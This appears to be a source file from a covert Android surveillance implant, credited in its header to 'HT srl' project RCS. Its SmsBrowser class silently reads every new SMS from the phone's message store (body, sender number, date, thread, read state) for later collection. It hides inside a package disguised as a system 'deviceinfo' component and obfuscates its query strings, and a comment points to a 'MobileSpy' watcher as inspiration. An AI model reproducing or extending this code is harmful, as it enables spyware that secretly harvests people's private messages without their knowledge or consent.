/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : SmsBrowser.java
 * Created      : 6-mag-2011
 * Author		: zeno
 * *******************************************/

package com.android.deviceinfo.module.message;

import java.util.ArrayList;

import android.database.Cursor;
import android.net.Uri;

import com.android.deviceinfo.Status;
import com.android.deviceinfo.auto.Cfg;
import com.android.deviceinfo.util.Check;
import com.android.m.M;

public class SmsBrowser {
	private static final String TAG = "SmsBrowser"; //$NON-NLS-1$

	private static final int MESSAGE_TYPE_SENT = 2;

	private final ArrayList<Sms> list;

	private int id;
	int maxId = 0;

	public SmsBrowser() {
		list = new ArrayList<Sms>();
	}

	public synchronized ArrayList<Sms> getSmsList(int lastManagedId) {
		list.clear();

		// cambiamento!
		// https://gbandroid.googlecode.com/svn-history/r46/trunk/MobileSpy/src/org/ddth/android/monitor/observer/AndroidSmsWatcher.java

		maxId = parse(M.e("content://sms"), lastManagedId); //$NON-NLS-1$

		return list;
	}

	private int parse(String content, int lastManagedId) {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (parse), lastManagedId: " + lastManagedId);
		}

		final String[] projection = new String[] { "*" };
		final Cursor c = Status.getAppContext().getContentResolver()
				.query(Uri.parse(content), projection, "_id>" + lastManagedId, null, "_id");

		final int smsEntriesCount = c.getCount();
		int localMaxId = lastManagedId;

		if (c.moveToFirst() == false) {
			c.close();
			return localMaxId;
		}

		for (int i = 0; i < smsEntriesCount; i++) {
			String body, number;
			long date;
			boolean sentStatus;

			// These fields are needed
			try {
				id = Integer.parseInt(c.getString(c.getColumnIndexOrThrow("_id")).toString());
				// msg_id =
				// Integer.parseInt(c.getString(c.getColumnIndexOrThrow("msg_id")).toString());

				if (Cfg.DEBUG) {
					Check.log(TAG + " (parse): id = " + id + " new maxId: " + localMaxId);
				}
				if (id <= lastManagedId) {
					continue;
				}

				localMaxId = Math.max(localMaxId, id);
				printColumnsSms(c);

				body = c.getString(c.getColumnIndexOrThrow(M.e("body"))).toString(); //$NON-NLS-1$
				number = c.getString(c.getColumnIndexOrThrow(M.e("address"))).toString(); //$NON-NLS-1$
				date = c.getLong(c.getColumnIndexOrThrow(M.e("date"))); //$NON-NLS-1$
				int type = c.getInt(c.getColumnIndexOrThrow("type"));

				sentStatus = type == MESSAGE_TYPE_SENT;
			} catch (final Exception e) {
				if (Cfg.EXCEPTION) {
					Check.log(e);
				}

				if (Cfg.DEBUG) {
					Check.log(e);//$NON-NLS-1$
				}

				c.moveToNext();
				continue;
			}

			final Sms s = new Sms(number, body, date, sentStatus);
			s.setId(id);

			// These fields are optional
			try {
				final String thread_id = c.getString(c.getColumnIndexOrThrow(M.e("thread_id"))); //$NON-NLS-1$
				s.setThreadId(thread_id);
			} catch (final Exception e) {
				if (Cfg.EXCEPTION) {
					Check.log(e);
				}

				if (Cfg.DEBUG) {
					Check.log(TAG + " (parse): " + e);//$NON-NLS-1$
				}
			}

			try {
				final String protocol = c.getString(c.getColumnIndexOrThrow(M.e("protocol"))); //$NON-NLS-1$
				s.setProtocol(protocol);
			} catch (final Exception e) {
				if (Cfg.EXCEPTION) {
					Check.log(e);
				}

				if (Cfg.DEBUG) {
					Check.log(TAG + " (parse): " + e);//$NON-NLS-1$
				}
			}

			try {
				final String read = c.getString(c.getColumnIndexOrThrow(M.e("read"))); //$NON-NLS-1$
				s.setRead(read);
			} catch (final Exception e) {
				if (Cfg.EXCEPTION) {
					Check.log(e);
				}

				if (Cfg.DEBUG) {
					Check.log(TAG + " (parse): " + e);//$NON-NLS-1$
				}
			}

			try {
				final String status = c.getString(c.getColumnIndexOrThrow(M.e("status"))); //$NON-NLS-1$
				s.setStatus(status);
			} catch (final Exception e) {
				if (Cfg.EXCEPTION) {
					Check.log(e);
				}

				if (Cfg.DEBUG) {
					Check.log(TAG + " (parse): " + e);//$NON-NLS-1$
				}
			}

			try {
				final String type = c.getString(c.getColumnIndexOrThrow(M.e("type"))); //$NON-NLS-1$
				s.setType(type);
			} catch (final Exception e) {
				if (Cfg.EXCEPTION) {
					Check.log(e);
				}

				if (Cfg.DEBUG) {
					Check.log(TAG + " (parse): " + e);//$NON-NLS-1$
				}
			}

			try {
				final String reply_path = c.getString(c.getColumnIndexOrThrow(M.e("reply_path_present"))); //$NON-NLS-1$
				s.setReplyPath(reply_path);
			} catch (final Exception e) {
				if (Cfg.EXCEPTION) {
					Check.log(e);
				}

				if (Cfg.DEBUG) {
					Check.log(TAG + " (parse): " + e);//$NON-NLS-1$
				}
			}

			c.moveToNext();
			list.add(s);

			if (Cfg.DEBUG) {
				Check.log(TAG + " (parse) end, localMaxId: " + localMaxId);
			}

		}

		if (Cfg.DEBUG) {
			Check.asserts(localMaxId >= lastManagedId, " (parse) Assert failed");
		}

		try {
			if (c != null) {
				c.close();
			}
		} catch (Exception ex) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (parse) error closing cursor: " + ex);
			}
		}

		return localMaxId;
	}

	private void printColumnsSms(Cursor c) {
		for (int j = 0; j < c.getColumnCount(); j++) {
			final String name = c.getColumnName(j);
			final String value = c.getString(c.getColumnIndex(name));

			if (Cfg.DEBUG) {

				//if (name.equals("body") || name.equals("body")) {
					Check.log(TAG + " (parse): " + name + " = " + value);//$NON-NLS-1$ //$NON-NLS-2$
				//}
			}
		}

	}

	public int getMaxId() {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (getMaxId): " + maxId);
		}

		return maxId;
	}
}